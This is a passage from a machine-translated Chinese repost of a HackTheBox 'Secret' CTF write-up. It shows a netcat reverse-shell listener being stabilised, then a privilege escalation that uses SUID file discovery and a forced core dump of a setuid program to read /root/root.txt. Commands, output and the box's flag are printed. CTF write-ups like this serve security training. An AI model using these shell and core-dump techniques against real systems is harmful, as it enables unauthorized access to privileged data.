^Z<br/>zsh: suspended  nc -lvvp 1337<br/>┌──(root💀kali)-[~/htb/secret]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -lvvp 1337<br/>dasith@secret:~/local-web$</span></pre><h1 id="4884" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">列举</h1><p id="5922" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">排序后，我四处查看，最终找到了一个名为count的文件，它设置了sticky位:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="4270" class="nc km iq my b gy nd ne l nf ng">dasith@secret:~/local-web$ find / -type f -perm -u=s 2&gt;/dev/null<br/>&lt;SNIP&gt;<br/>/opt/count</span></pre><p id="11e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以假设这是重要的。如果我们查看/opt文件夹，我们还会发现计数文件的源代码:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="8775" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/opt$ ls -l<br/>-rw-r--r-- 1 root root  3736 Oct  7 10:01 code.c<br/>-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count<br/>-rw-r--r-- 1 root root  4622 Oct  7 10:04 valgrind.log<br/><br/>dasith@secret:~/local-web$ file /opt/count<br/>/opt/count: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=615b7e12374cd1932161a6a9d9a737a63c7be09a, for GNU/Linux 3.2.0, not stripped</span></pre><p id="4446" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们看看这个文件做了什么:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f118" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/opt$ ./count<br/>Enter source file/directory name: /root/root.txt<br/><br/>Total characters = 33<br/>Total words      = 2<br/>Total lines      = 2<br/>Save results a file? [y/N]: y<br/>Path: /tmp/output.txt</span></pre><p id="3e37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它要求一个源文件，我给了它根标志，它似乎在做字符和字数统计。保存文件不能给我来源:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="eb58" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/opt$ ls /tmp<br/> output.txt<br/> snap.lxd<br/> tmux-1000<br/> vmware-root_730-2999460803<br/><br/>dasith@secret:/opt$ cat /tmp/output.txt <br/>Total characters = 33<br/>Total words      = 2<br/>Total lines      = 2</span></pre><p id="bbc4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我只是把输出保存到一个文本文件中。</p><h1 id="9490" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">核心转储</h1><p id="f422" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">接下来，我们需要查看源代码，看看我们是否能理解这个文件的作用。这是一个很长的文件，但是我们可以看到它读取内存中提供的文件，在内存中计算字符和单词的数量。有趣的部分接近尾声:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3c10" class="nc km iq my b gy nd ne l nf ng">// Enable coredump generation<br/>prctl(PR_SET_DUMPABLE, 1);</span></pre><p id="fffc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到这里的<a class="ae nn" href="http://manpages.ubuntu.com/manpages/bionic/man2/prctl.2.html" rel="noopener ugc nofollow" target="_blank"/>:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="1bc4" class="nc km iq my b gy nd ne l nf ng">PR_SET_DUMPABLE (since Linux 2.3.20)<br/>Set the state of the "dumpable" flag, which determines whether core dumps are<br/>produced for the calling process upon delivery of a signal whose default behavior<br/>is to produce a core dump.</span></pre><p id="b419" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这意味着程序正在设置标志，以便在终止时将核心转储写到一个文件中。我们可以利用这一点将内存内容转储到一个文件中，而root.txt文件保存在其中。</p><p id="501c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用与上面相同的卷曲方法连接第二个壳。然后，在shell 1中，我们再次运行count程序并读取根标志:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="ef3a" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/opt$ ./count<br/>Enter source file/directory name: /root/root.txt<br/>Total characters = 33<br/>Total words      = 2<br/>Total lines      = 2<br/>Save results a file? [y/N]:</span></pre><h1 id="3cc3" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">紧急措施</h1><p id="a7fd" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">将它放在保存点，切换到第二个shell，查看正在运行的进程:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nm"><img src="../Images/d52e902713d398218b6d04ee07f6d5a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kaLbinfB9vX-B2CXW5YjDQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">查看在机器上运行的进程</figcaption></figure><p id="99e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">终止进程以进行计数:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="8b5e" class="nc km iq my b gy nd ne l nf ng">dasith@secret:~/local-web$ kill 96020<br/>kill 96020</span></pre><p id="34dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在打开核心转储的包装，以便我们可以查看它:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="7c06" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/opt$ cd /var/crash<br/><br/>dasith@secret:/var/crash$ ls -l<br/>-rw-r----- 1 root   root   27203 Oct  6 18:01 _opt_count.0.crash<br/>-rw-r----- 1 dasith dasith 28006 Nov 18 21:40 _opt_count.1000.crash<br/>-rw-r----- 1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash<br/><br/>dasith@secret:/var/crash$ mkdir /dev/shm/pencer<br/><br/>dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /dev/shm/pencer<br/><br/>dasith@secret:/var/crash$ cd /dev/shm/pencer<br/><br/>dasith@secret:/dev/shm/pencer$ ls<br/>&lt;SNIP&gt;<br/>CoreDump<br/>&lt;SNIP&gt;</span></pre><h1 id="0268" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">根标志</h1><p id="7eaf" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们现在也可以使用字符串来查看CoreDump文件的内容:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="1010" class="nc km iq my b gy nd ne l nf ng">dasith@secret:/dev/shm/pencer$ strings CoreDump<br/>strings CoreDump<br/>&lt;SNIP&gt;<br/>Enter source file/directory name:<br/>%99s<br/>Save results a file? [y/N]: <br/>Path: <br/>Could not open %s for writing<br/>:*3$"<br/>Save results a file? [y/N]: words      = 2<br/>Total lines      = 2<br/>/root/root.txt<br/>ed72112dc7721f564f49b6846a2f0e22</span></pre><p id="75e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出确实很长，但是您可以看到其中的计数文件输出，并看到已经读入的根标志的内容。</p><p id="5fb5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我认为这对于一个简单的盒子来说很棘手。我希望你喜欢它。</p><p id="1c54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下次见。</p></div><div class="ab cl oa ob hu oc" role="separator"><span class="od bw bk oe of og"/><span class="od bw bk oe of og"/><span class="od bw bk oe of"/></div><div class="ij ik il im in"><p id="5417" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="4334" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae nn" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nn" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="2f8d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="oh">原载于2022年4月21日</em><a class="ae nn" href="https://pencer.io/ctf/ctf-htb-secret/" rel="noopener ugc nofollow" target="_blank"><em class="oh">https://pencer . io</em></a><em class="oh">。</em></p></div></div>    
</body>
</html>